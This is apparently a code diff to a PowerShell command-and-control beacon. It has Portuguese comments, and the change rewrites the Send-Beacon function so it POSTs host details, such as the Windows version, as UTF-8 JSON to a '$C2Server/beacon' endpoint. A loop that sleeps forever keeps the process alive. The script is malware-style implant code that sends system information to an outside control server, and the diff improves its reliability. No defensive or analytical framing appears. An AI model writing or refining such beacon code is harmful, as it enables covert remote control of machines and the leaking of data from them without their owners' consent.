@@ -21,10 +21,29 @@ function Send-Beacon {
             os = (Get-WmiObject Win32_OperatingSystem).Caption
         } | ConvertTo-Json
         
-        $response = Invoke-RestMethod -Uri "$C2Server/beacon" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop
-        return $response
+        # Forçar UTF-8 sem BOM
+        $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($body)
+        
+        # Criar requisição manualmente para controlar encoding
+        $webRequest = [System.Net.WebRequest]::Create("$C2Server/beacon")
+        $webRequest.Method = "POST"
+        $webRequest.ContentType = "application/json; charset=utf-8"
+        $webRequest.ContentLength = $utf8Body.Length
+        
+        $requestStream = $webRequest.GetRequestStream()
+        $requestStream.Write($utf8Body, 0, $utf8Body.Length)
+        $requestStream.Close()
+        
+        $response = $webRequest.GetResponse()
+        $reader = New-Object System.IO.StreamReader($response.GetResponseStream(), [System.Text.Encoding]::UTF8)
+        $responseText = $reader.ReadToEnd()
+        $reader.Close()
+        $response.Close()
+        
+        return $responseText | ConvertFrom-Json
     }
     catch {
+        Write-Host "[!] Erro no beacon: $_" -ForegroundColor Red
         return $null
     }
 }
@@ -76,3 +95,4 @@ while ($true) {
 
 # Mantém o processo rodando
 while ($true) { Start-Sleep -Seconds 3600 }
+
